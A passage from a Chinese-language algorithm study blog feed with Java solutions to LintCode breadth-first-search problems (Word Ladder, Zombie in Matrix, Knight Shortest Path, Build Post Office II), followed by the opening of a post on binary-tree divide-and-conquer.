<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, ArrayList&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(String word:dict)&#123;</span><br><span class="line">        ArrayList&lt;String&gt; neighbors = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(String nei:dict)&#123;</span><br><span class="line">            <span class="keyword">if</span>(distance(word, nei) == <span class="number">1</span>)&#123;</span><br><span class="line">                neighbors.add(nei);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(word, neighbors);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第二种构造图的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造邻接表</span></span><br><span class="line">Map&lt;String, ArrayList&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span>(String word:dict)&#123;</span><br><span class="line">    ArrayList&lt;String&gt; neighbors = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; word.length(); i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> a = <span class="string">'a'</span>; a &lt; <span class="string">'z'</span>; a++)&#123;</span><br><span class="line">            String n = word.substring(<span class="number">0</span>, i) + a + word.substring(i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(dict.contains(n))&#123;</span><br><span class="line">                neighbors.add(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    map.put(word, neighbors);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终完整的代码，并没有把邻接表构造出来，而是在while中利用了那种思想来找相邻的单词</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ladderLength</span><span class="params">(String start, String end, Set&lt;String&gt; dict)</span> </span>&#123;</span><br><span class="line">    dict.add(start);</span><br><span class="line">    dict.add(end);</span><br><span class="line">    Queue&lt;String&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(start);</span><br><span class="line">    Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    set.add(start);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size;i++)&#123;</span><br><span class="line">            String word = queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(word.equals(end)) &#123;<span class="keyword">return</span> len;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; word.length(); j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">char</span> a = <span class="string">'a'</span>; a &lt;= <span class="string">'z'</span>; a++)&#123;</span><br><span class="line">                    String newWord = word.substring(<span class="number">0</span>, j) + a + word.substring(j+<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(!set.contains(newWord) &amp;&amp; dict.contains(newWord))&#123;</span><br><span class="line">                        queue.offer(newWord);</span><br><span class="line">                        set.add(newWord);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Follow Up: <a href="http://www.lintcode.com/en/problem/word-ladder-ii/" target="_blank" rel="noopener">Word Ladder ii</a> 要求找到所有的word ladder，则需要用DFS去搜索。在下节课会讲到</p>
<h3 id="More-2"><a href="#More-2" class="headerlink" title="More"></a>More</h3><p><a href="http://www.lintcode.com/en/problem/build-post-office/" target="_blank" rel="noopener">Build Post Office</a><br><a href="http://www.lintcode.com/en/problem/build-post-office-ii/" target="_blank" rel="noopener">Build Post Office ii</a></p>
<h1 id="矩阵上的宽搜"><a href="#矩阵上的宽搜" class="headerlink" title="矩阵上的宽搜"></a>矩阵上的宽搜</h1><p>矩阵实际上也是一种特殊的图，矩阵上的宽搜与图的宽搜的区别就在于：矩阵找邻居节点的时候不需要遍历一个neighbor，而是通过<code>(x, y)</code>加上坐标变换矩阵<code>[[0,1],[0,-1],[1,0],[-1,0]]</code>来计算的。 所以我们完全可以按照做图的宽搜的思路来做矩阵宽搜。</p>
<p>矩阵宽搜问题的时间复杂度是<code>O(R * C)</code>， R是行数， C是列数。</p>
<p>矩阵上的宽搜有一个问题是如何去重，如果我们用<code>int[]</code>数组来存储坐标的话，set就无法去重，因为set中存储的是数组的地址。一般来说我们都需要一个<code>boolean visited[][]</code>来记录是否访问到过</p>
<h2 id="Example1-Zombie-in-Matrix"><a href="#Example1-Zombie-in-Matrix" class="headerlink" title="Example1: Zombie in Matrix"></a>Example1: Zombie in Matrix</h2><p><a href="http://www.lintcode.com/en/problem/zombie-in-matrix/" target="_blank" rel="noopener">Zombie in Matrix</a> 给了一个矩阵，其中有people, 有wall 有zombie。 zombie每天都可以把相邻的一个人变成zombie，问最少多少天可以把所有人变成zombie。 </p>
<p>其实就是一个最短路径问题，我们是用层级遍历，先找到所有的zombie，每天把每一个zombie周围的人都变成zombie，然后再将这些点进入queue。循环结束时的层数就是需要的天数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> PEOPLE = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> ZOMBIE = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> WALL = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">zombie</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] directionX = &#123;<span class="number">0</span>, <span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] directionY = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="comment">// 找到所有的zombie 和人的个数</span></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    Queue&lt;<span class="keyword">int</span>[]&gt; zombies = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; grid.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[i].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j] == ZOMBIE)&#123;</span><br><span class="line">                zombies.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i,j&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(grid[i][j] == PEOPLE)&#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> days = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!zombies.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = zombies.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] z = zombies.poll();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> x = z[<span class="number">0</span>] + directionX[j];</span><br><span class="line">                <span class="keyword">int</span> y = z[<span class="number">1</span>] + directionY[j];</span><br><span class="line">                <span class="keyword">if</span>(inBound(x, y, grid) &amp;&amp; grid[x][y] == PEOPLE)&#123;</span><br><span class="line">                    grid[x][y] = ZOMBIE;</span><br><span class="line">                    System.out.println(<span class="string">"Day"</span> + days + <span class="string">"("</span> + x + <span class="string">","</span> + y + <span class="string">")"</span>);</span><br><span class="line">                    zombies.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;x, y&#125;);</span><br><span class="line">                    num--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        days++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> days - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">inBound</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span>[][] grid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = grid.length;</span><br><span class="line">    <span class="keyword">int</span> m = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">return</span> x &gt;= <span class="number">0</span> &amp;&amp; x &lt; n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example2-Knight-Shortest-Path"><a href="#Example2-Knight-Shortest-Path" class="headerlink" title="Example2: Knight Shortest Path"></a>Example2: Knight Shortest Path</h2><p><a href="http://www.lintcode.com/problem/knight-shortest-path/" target="_blank" rel="noopener">Knight shortest path</a> 这是一道简单图最短路径问题，规定骑士能走的方式，给定棋盘、起点和终点，求最短路径。其实也是一个和上题类似的层级遍历的问题，只不过想象这次zombie不再感染身边的人，而是按象棋中马的方式去感染，直到感染到目标位置的人。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">shortestPath</span><span class="params">(<span class="keyword">boolean</span>[][] grid, Point source, Point destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span> || grid[<span class="number">0</span>].length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] deltaX = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] deltaY = &#123;<span class="number">2</span>, -<span class="number">2</span>, <span class="number">1</span>, -<span class="number">1</span>, <span class="number">2</span>, -<span class="number">2</span>, <span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> m = grid.length;</span><br><span class="line">    <span class="keyword">int</span> n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    Queue&lt;Point&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(source);</span><br><span class="line">    grid[source.x][source.y] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">            Point p = queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(p.x == destination.x &amp;&amp; p.y == destination.y)&#123;</span><br><span class="line">                <span class="keyword">return</span> len;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">                Point newPoint = <span class="keyword">new</span> Point(p.x+deltaX[j], p.y+deltaY[j]);</span><br><span class="line">                <span class="keyword">if</span>(isValid(grid, newPoint))&#123;</span><br><span class="line">                    queue.offer(newPoint);</span><br><span class="line">                    <span class="comment">//System.out.println(newPoint.x + "," + newPoint.y);</span></span><br><span class="line">                    grid[newPoint.x][newPoint.y] = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(<span class="keyword">boolean</span>[][] grid, Point newPoint)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = newPoint.x;</span><br><span class="line">    <span class="keyword">int</span> y = newPoint.y;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> &lt;= x &amp;&amp; x &lt; grid.length &amp;&amp; <span class="number">0</span> &lt;= y &amp;&amp; y &lt; grid[<span class="number">0</span>].length)&#123;</span><br><span class="line">        <span class="keyword">return</span> !grid[x][y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example3-Build-Post-Office-ii"><a href="#Example3-Build-Post-Office-ii" class="headerlink" title="Example3: Build Post Office ii"></a>Example3: Build Post Office ii</h2><p><a href="http://www.lintcode.com/en/problem/build-post-office-ii/" target="_blank" rel="noopener">Build Post Office ii</a> </p>
<p>乍一看的时候会觉得很难，但实际上就是多次利用宽度优先搜索，求多个最短路径。题目让求到所有房子距离之和最近的空地，我们会想到可以遍历每一个空地，求出它到所有房子的距离，然后累加到一个数组中，最后去找和最小的那个。</p>
<p>或者我们可以倒过来想，遍历每一个房子，求出房子到所有空地的距离，将这个值累加到空地上，最后找出累加和最小的空地。</p>
<p>下面是第二种思想的代码：（两种思想代码非常类似，运行时间也相差无几）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> WALL = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> HOUSE = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> EMPTY = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">shortestDistance</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 找到所有的house</span></span><br><span class="line">    <span class="keyword">int</span> numHouse = <span class="number">0</span>;</span><br><span class="line">    ArrayList&lt;<span class="keyword">int</span>[]&gt; house = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; grid.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j] == HOUSE)&#123;</span><br><span class="line">                house.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i, j&#125;);</span><br><span class="line">                numHouse++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对于每个house进行一次dfs, 将房子到某一空地的距离加到distance中</span></span><br><span class="line">    <span class="keyword">int</span>[][] distance = <span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">    <span class="keyword">int</span>[][] reach = <span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span>[] loc: house)&#123;</span><br><span class="line">        dfs(loc[<span class="number">0</span>], loc[<span class="number">1</span>], distance, reach, grid);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 全部dfs之后，distance中最小的位置就是到所有房子距离最小的空地</span></span><br><span class="line">    <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i  &lt; grid.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j] == EMPTY &amp;&amp; reach[i][j] == numHouse)&#123;</span><br><span class="line">                min = Math.min(distance[i][j], min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(min == Integer.MAX_VALUE)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span>[][] distance, <span class="keyword">int</span>[][] reach, <span class="keyword">int</span>[][] grid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] deltaX = &#123;<span class="number">0</span> , <span class="number">0</span> , -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] deltaY = &#123;<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    Queue&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">boolean</span>[][] isVisited = <span class="keyword">new</span> <span class="keyword">boolean</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">    queue.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;x, y&#125;);</span><br><span class="line">    <span class="keyword">int</span> level = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] loc = queue.poll();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> newx = loc[<span class="number">0</span>] + deltaX[j];</span><br><span class="line">                <span class="keyword">int</span> newy = loc[<span class="number">1</span>] + deltaY[j];</span><br><span class="line">                <span class="keyword">if</span>(inBound(newx, newy, grid) &amp;&amp; grid[newx][newy] == EMPTY &amp;&amp; !isVisited[newx][newy])&#123;</span><br><span class="line">                    isVisited[newx][newy] = <span class="keyword">true</span>;</span><br><span class="line">                    queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;newx, newy&#125;);</span><br><span class="line">                    distance[newx][newy] += level;</span><br><span class="line">                    reach[newx][newy] ++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        level++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">inBound</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span>[][] grid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = grid.length;</span><br><span class="line">    <span class="keyword">int</span> n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">return</span> x &gt;= <span class="number">0</span> &amp;&amp; x &lt; m &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-二叉树与分治算法]]></title>
      <url>/2018/03/01/Algorithms/%E4%B9%9D%E7%AB%A0-%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%88%86%E6%B2%BB%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="二叉树与分治算法"><a href="#二叉树与分治算法" class="headerlink" title="二叉树与分治算法"></a>二叉树与分治算法</h1><p>这是九章算法班第二讲，主讲二叉树相关的问题。碰到二叉树的问题，就想想整棵树在该问题上的结果和左右儿子在该问题上的结果之间的联系是什么。</p>
<blockquote>
<p>通过O(n)的时间把n的问题变成了两个n/2，算法的时间复杂度是O(n*log(n)) 。通过O(1)的时间把n的问题变成了两个n/2，算法的时间复杂度为O(n)</p>
</blockquote>
<a id="more"></a>
<h2 id="二叉树的遍历算法"><a href="#二叉树的遍历算法" class="headerlink" title="二叉树的遍历算法"></a>二叉树的遍历算法</h2><p>关于二叉树的遍历我之前有总结过：<a href="https://xuyangbai.github.io/2017/10/22/Algorithms/BinaryTreeTraversal/" target="_blank" rel="noopener">Binary Tree Traversal</a></p>
<h2 id="二叉树的深度优先搜索"><a href="#二叉树的深度优先搜索" class="headerlink" title="二叉树的深度优先搜索"></a>二叉树的深度优先搜索</h2><p>深度优先搜索DFS可以通过递归实现，而二叉树上的递归方式又分为两种，一种是遍历法(traverse) 一种是分治法(Divide Conquer)</p>
<p>递归的三要素：</p>
<ol>
<li>递归的定义(以前序遍历为例题)<br> a. 对于遍历法: 求出以root为根的树的前序遍历，结果丢进result中<br> b. 对于分治法: 求出以root为根的树的前序遍历并返回</li>
<li>递归的拆解(如何把当前问题拆分成左子树和右子树的问题, 只需要考虑这一层的逻辑</li>
<li>递归的出口(一般以root==null或者root是叶子结点作为出口)</li>
</ol>
<p>在我自己看来分治法更容易理解一些， 只用想清楚整棵树上的结果和左右子树的结果之间的关系即可，所以我一般都使用分治法来写。</p>
<h3 id="Tranverse-Vs-Divide-Conquer"><a href="#Tranverse-Vs-Divide-Conquer" class="headerlink" title="Tranverse Vs. Divide Conquer"></a>Tranverse Vs. Divide Conquer</h3><ol>
<li>都是Recursion Algorithm递归算法</li>
<li>traverse结果存放在参数中(或者使用全局变量)，所有节点公用一个result，divide conquer结果存放在返回值中，每个结点独有一个result。</li>
</ol>
<h3 id="Example1-Maximum-Depth-of-Binary-Tree"><a href="#Example1-Maximum-Depth-of-Binary-Tree" class="headerlink" title="Example1: Maximum Depth of Binary Tree"></a>Example1: Maximum Depth of Binary Tree</h3><p><a href="http://www.lintcode.com/problem/maximum-depth-of-binary-tree/" target="_blank" rel="noopener">二叉树的最大深度</a> </p>
<p>tranverse做法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> depth;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">	depth = <span class="number">0</span>;</span><br><span class="line">	helper(root, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> depth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(TreeNode node, <span class="keyword">int</span> curDepth)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (node == <span class="keyword">null</span> ) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(curDepth &gt; depth) &#123;</span><br><span class="line">		depth = curDepth;</span><br><span class="line">	&#125;</span><br><span class="line">	helper(node.left, curDepth+<span class="number">1</span>);</span><br><span class="line">	helper(node.right, curDepth+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
